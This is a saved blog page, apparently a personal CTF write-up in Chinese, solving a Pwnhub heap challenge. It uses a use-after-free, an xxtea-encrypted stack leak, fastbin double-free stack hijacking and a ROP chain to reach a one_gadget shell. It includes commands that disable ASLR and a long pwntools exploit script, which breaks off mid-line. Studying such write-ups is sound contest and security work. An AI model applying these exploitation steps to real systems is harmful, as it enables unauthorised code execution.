@@ -1,0 +1,508 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>万圣节Pwnhub一道题 - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="一、pwnhub这题感觉挺有意思的 ，思路清晰了，但是过程煎熬了，下面记录下自己经历的事和学到的东西。
+保护全开，就不说了直接看看ida：
+
+
+
+3个功能，一个malloc、一个free、一个wri,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">万圣节Pwnhub一道题</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/Pwnhub%E4%B8%80%E9%81%93%E9%A2%98/" title="万圣节Pwnhub一道题" class="">万圣节Pwnhub一道题</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    36k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    33 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/xxtea/" rel="tag">xxtea</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h3 id="一、pwnhub"><a href="#一、pwnhub" class="headerlink" title="一、pwnhub"></a>一、pwnhub</h3><p>这题感觉挺有意思的 ，思路清晰了，但是过程煎熬了，下面记录下自己经历的事和学到的东西。</p>
+<p>保护全开，就不说了直接看看ida：</p>
+<a id="more"></a>
+
+<p><img src="/blog_img/1572877622191.png" alt="57287762219"></p>
+<p>3个功能，一个malloc、一个free、一个write函数，这里先看下malloc函数：</p>
+<p><img src="/blog_img/1572877821361.png" alt="57287782136"></p>
+<p>先申请一个0x10的没用的块用来隔开堆块，再申请不超过0xff的堆块去写内容，然后每一次malloc，num就会加一，这里只能malloc10次，超了就没了，接着看下free函数：</p>
+<p><img src="/blog_img/1572878362050.png" alt="57287836205"></p>
+<p>很明显的UAF漏洞，然后只free那个自己申请的内容块，0x10的堆块作为标志位，没有被free。</p>
+<p>下面看下write函数在干嘛：</p>
+<p><img src="/blog_img/1572878150385.png" alt="57287815038"></p>
+<p>这里有个xxtea函数加密，可以实现将输入加密再输出来，但是我们输入的是0x20字节，它memcopy时会拷贝0x28字节，所以会将栈地址加密后给打印出来，这里我们需要一点逆向知识，解密xxtea，得到栈地址。</p>
+<p>好了程序分析完了，一个洞，UAF，一个地址栈地址，要实现getshell：</p>
+<h5 id="1、先来看看作者的预期解："><a href="#1、先来看看作者的预期解：" class="headerlink" title="1、先来看看作者的预期解："></a>1、先来看看作者的预期解：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、先将栈地址打印出来，xxtea解密</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、通过fastbin attack的攻击，<span class="keyword">double</span> <span class="built_in">free</span>实现改堆块的末尾，使其指向有特定的堆块地址(那个unsort bin大小刚好是<span class="number">0x7f</span>，FD有真实地址)，接着申请到倒数第二块，就可以通过修改末尾来实现申请到malloc_hook<span class="number">-0x23</span>的fake_chunk（<span class="number">1</span>/<span class="number">16</span>概率）</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、申请fake_chunk出来后，在malloc_hook<span class="number">-8</span>位置处写入合适的<span class="built_in">size</span>，作为新的fake_chunk的<span class="built_in">size</span>，在malloc_hook+<span class="number">8</span>（新的fake_chunk的bk指针）写入栈地址（保证能正常脱链）</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、unsorted bin attack我们的chunk的bk指针(malloc_hook<span class="number">-0x10</span>)，就会在<span class="built_in">malloc</span>中写入main_arena+<span class="number">88</span>地址，同时因为这个新的fake_chunk满足我们的需求就会被申请出来，我们可以改FD，也就是改malloc_hook里面的地址为onegadget(house of romain)</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、再次<span class="built_in">malloc</span>触发getshell(看脸爆破！！！)</span><br></pre></td></tr></table></figure>
+
+<h5 id="通过double-free实现改堆块末尾，来造成fd指针有0x7f开头的地址，unsorteb-bin可以实现边写入main-arena-88又同步申请fake-chunk，只要bk指针布局好了就不怕（bk指针要是可写的地址才行），一种新的攻击方式吧，学习了，但是这题这样做，因为堆块次数的限制，几乎做不出来，所以放弃了。"><a href="#通过double-free实现改堆块末尾，来造成fd指针有0x7f开头的地址，unsorteb-bin可以实现边写入main-arena-88又同步申请fake-chunk，只要bk指针布局好了就不怕（bk指针要是可写的地址才行），一种新的攻击方式吧，学习了，但是这题这样做，因为堆块次数的限制，几乎做不出来，所以放弃了。" class="headerlink" title="通过double free实现改堆块末尾，来造成fd指针有0x7f开头的地址，unsorteb bin可以实现边写入main_arena+88又同步申请fake_chunk，只要bk指针布局好了就不怕（bk指针要是可写的地址才行），一种新的攻击方式吧，学习了，但是这题这样做，因为堆块次数的限制，几乎做不出来，所以放弃了。"></a>通过double free实现改堆块末尾，来造成fd指针有0x7f开头的地址，unsorteb bin可以实现边写入main_arena+88又同步申请fake_chunk，只要bk指针布局好了就不怕（bk指针要是可写的地址才行），一种新的攻击方式吧，学习了，但是这题这样做，因为堆块次数的限制，几乎做不出来，所以放弃了。</h5><h4 id="2、正解："><a href="#2、正解：" class="headerlink" title="2、正解："></a>2、正解：</h4><p>这里换一种新的思路去做题，就是劫持到栈上，我们一步步来分析这题，首先关闭内存地址随机化：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="string">"echo 0 &gt; /proc/sys/kernel/randomize_va_space"</span></span><br></pre></td></tr></table></figure>
+
+<p>1、首先泄露出栈地址，手撕python代码，解密xxtea：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">_DELTA = <span class="number">0x9E3779B9</span> </span><br><span class="line">v = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(v,n,key)</span>:</span>  </span><br><span class="line">    n = n<span class="number">-1</span></span><br><span class="line">    z = v[n]  </span><br><span class="line">    y = v[<span class="number">0</span>]  </span><br><span class="line">    q = <span class="number">6</span> + <span class="number">52</span> // (n + <span class="number">1</span>)  </span><br><span class="line">    sum1 = (q * _DELTA) &amp; <span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="keyword">while</span> (sum1 != <span class="number">0</span>):  </span><br><span class="line">        e = sum1 &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>  </span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> xrange(n, <span class="number">0</span>, <span class="number">-1</span>):  </span><br><span class="line">            z = v[p - <span class="number">1</span>]  </span><br><span class="line">            v[p] = (v[p] - ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (sum1 ^ y) + (key[p &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span>  </span><br><span class="line">            y = v[p]  </span><br><span class="line">        z = v[n]  </span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (sum1 ^ y) + (key[<span class="number">0</span> &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span>  </span><br><span class="line">        y = v[<span class="number">0</span>]  </span><br><span class="line">        sum1 = (sum1 - _DELTA) &amp; <span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="keyword">return</span> v  </span><br><span class="line">ru(<span class="string">"welcome to ziiiro's classical heap quiz\n"</span>)</span><br><span class="line">write(<span class="string">'A'</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">    v[i] = u32(rc(<span class="number">4</span>))</span><br><span class="line">k = [<span class="number">0x6854CC6D</span>,<span class="number">0x0A4BB7D0E</span>,<span class="number">0x660B8F8F</span>,<span class="number">0x714829A5</span>]</span><br><span class="line">n = <span class="number">0xb</span></span><br><span class="line">h = decrypt(v,n,k)</span><br><span class="line">stack = (h[<span class="number">9</span>]&lt;&lt;<span class="number">32</span>)+h[<span class="number">8</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack---&gt;"</span> + hex(stack)</span><br></pre></td></tr></table></figure>
+
+<p>2、有了栈地址后，我们通过fastbin的attack(double free)，劫持栈空间(找到有0x7f开头的栈地址，找的时候仔细点即可)并申请出来：</p>
+<p><img src="/blog_img/1573216131550.png" alt="57321613155"></p>
+<p><img src="/blog_img/1573215014141.png" alt="57321501414"></p>
+<p>可以看到我们找的fake_chunk是0x7fffffffdb7d，写入的内容，我们覆盖了read函数返回地址的末尾3位为write函数(0x4c9)，这样就能打印出这个地址（需要1/16的爆破），从而得到程序的基地址，这里解释下，因为read函数调用时，会将下一条将要执行的指令地址先压入栈中，也就是说rsp此时放的是ret地址，这样我们只要改写了rsp处的ret地址就能控制程序的执行流程，这是和以往有点不太一样的地方。</p>
+<p>有了基地址，rop链子就准备好了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret = base_addr + <span class="number">0x1513</span></span><br><span class="line">pop_rsi_r15_ret = base_addr + <span class="number">0x1511</span></span><br><span class="line">read_plt = base_addr + elf.sym[<span class="string">"read"</span>]</span><br><span class="line">write_plt = base_addr + elf.sym[<span class="string">"write"</span>]</span><br><span class="line">num_addr = base_addr + <span class="number">0x20203C</span></span><br><span class="line">main_addr = base_addr + <span class="number">0xe66</span></span><br><span class="line">write_got = base_addr + <span class="number">0x201F88</span></span><br></pre></td></tr></table></figure>
+
+<p>接着我们继续fastbin的attack，继续劫持栈空间，又是改rsp的read的ret地址，这样反复控制程序的执行流程，就能调用read函数改写申请的malloc次数的值因为超过9就无法再次申请，所以先解除这个限制：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">3</span></span><br><span class="line">py += p64(<span class="number">0</span>)</span><br><span class="line">py += p64(pop_rdi_ret)</span><br><span class="line">py += p64(<span class="number">0</span>)</span><br><span class="line">py += p64(pop_rsi_r15_ret)</span><br><span class="line">py += p64(num_addr)</span><br><span class="line">py += p64(<span class="number">0</span>)</span><br><span class="line">py += p64(read_plt)</span><br><span class="line">py += p64(main_addr)</span><br><span class="line">fastbin_attack(fake_chunk<span class="number">-0x20</span>,py)</span><br><span class="line">sd(<span class="string">'\x00'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>接着，继续fastbin_attack，我们就能调用write函数泄露出真实地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">"welcome to ziiiro's classical heap quiz\n"</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">3</span></span><br><span class="line">py += p64(<span class="number">0</span>)</span><br><span class="line">py += p64(pop_rdi_ret)</span><br><span class="line">py += p64(<span class="number">1</span>)</span><br><span class="line">py += p64(pop_rsi_r15_ret)</span><br><span class="line">py += p64(write_got)</span><br><span class="line">py += p64(<span class="number">0</span>)</span><br><span class="line">py += p64(write_plt)</span><br><span class="line">py += p64(main_addr)</span><br><span class="line">fastbin_attack(fake_chunk<span class="number">-0x58</span>,py)</span><br><span class="line"></span><br><span class="line">libc_base = u64(rc(<span class="number">8</span>)) - libc.sym[<span class="string">"write"</span>]</span><br><span class="line">onegadget = libc_base + onegadget64[<span class="number">3</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base---&gt;"</span> + hex(libc_base)</span><br></pre></td></tr></table></figure>
+
+<p>再来一次就能填onegadget了，最后getshell：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">"welcome to ziiiro's classical heap quiz\n"</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">3</span></span><br><span class="line">py += p64(<span class="number">0</span>)</span><br><span class="line">py += p64(onegadget)</span><br><span class="line">fastbin_attack(fake_chunk<span class="number">-0x90</span>,py)</span><br></pre></td></tr></table></figure>
+
+<p>最后，先开回pie，再爆破，上exp：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="string">"echo 1 &gt; /proc/sys/kernel/randomize_va_space"</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./classic'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./classic'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line">onegadget64 = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">_DELTA = <span class="number">0x9E3779B9</span> </span><br><span class="line">v = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(v,n,key)</span>:</span>  </span><br><span class="line">    n = n<span class="number">-1</span></span><br><span class="line">    z = v[n]  </span><br><span class="line">    y = v[<span class="number">0</span>]  </span><br><span class="line">    q = <span class="number">6</span> + <span class="number">52</span> // (n + <span class="number">1</span>)  </span><br><span class="line">    sum1 = (q * _DELTA) &amp; <span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="keyword">while</span> (sum1 != <span class="number">0</span>):  </span><br><span class="line">        e = sum1 &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>  </span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> xrange(n, <span class="number">0</span>, <span class="number">-1</span>):  </span><br><span class="line">            z = v[p - <span class="number">1</span>]  </span><br><span class="line">            v[p] = (v[p] - ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (sum1 ^ y) + (key[p &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span>  </span><br><span class="line">            y = v[p]  </span><br><span class="line">        z = v[n]  </span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (sum1 ^ y) + (key[<span class="number">0</span> &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span>  </span><br><span class="line">        y = v[<span class="number">0</span>]  </span><br><span class="line">        sum1 = (sum1 - _DELTA) &amp; <span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="keyword">return</span> v  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(con,size,content)</span>:</span></span><br><span class="line">    sd(<span class="string">'\x01'</span>)</span><br><span class="line">    sd(con)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    sd(<span class="string">'\x02'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(content)</span>:</span></span><br><span class="line">    sd(<span class="string">'\x03'</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastbin_attack</span><span class="params">(chunk,py)</span>:</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    malloc(<span class="string">'3'</span>*<span class="number">8</span>,<span class="number">0x60</span>,p64(chunk))</span><br><span class="line">    malloc(<span class="string">'4'</span>*<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">'d'</span>*<span class="number">0x60</span>)</span><br><span class="line">    malloc(<span class="string">'5'</span>*<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">'e'</span>*<span class="number">0x60</span>)</span><br><span class="line">    malloc(<span class="string">'6'</span>*<span class="number">0x8</span>,<span class="number">0x60</span>,py)</span><br><span class="line">    debug(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"welcome to ziiiro's classical heap quiz\n"</span>)</span><br><span class="line">    write(<span class="string">'A'</span>*<span class="number">0x20</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">        v[i] = u32(rc(<span class="number">4</span>))</span><br><span class="line">    k = [<span class="number">0x6854CC6D</span>,<span class="number">0x0A4BB7D0E</span>,<span class="number">0x660B8F8F</span>,<span class="number">0x714829A5</span>]</span><br><span class="line">    n = <span class="number">0xb</span></span><br><span class="line">    h = decrypt(v,n,k)</span><br><span class="line">    stack = (h[<span class="number">9</span>]&lt;&lt;<span class="number">32</span>)+h[<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"stack---&gt;"</span> + hex(stack)</span><br><span class="line">    fake_chunk = stack<span class="number">-0x163</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"fake_chunk---&gt;"</span> + hex(fake_chunk)</span><br><span class="line">    malloc(<span class="string">'0'</span>*<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">    malloc(<span class="string">'1'</span>*<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">'b'</span>*<span class="number">0x60</span>)</span><br><span class="line">    malloc(<span class="string">'2'</span>*<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">'c'</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    py = <span class="string">'a'</span>*<span class="number">3</span></span><br><span class="line">    py += p64(<span 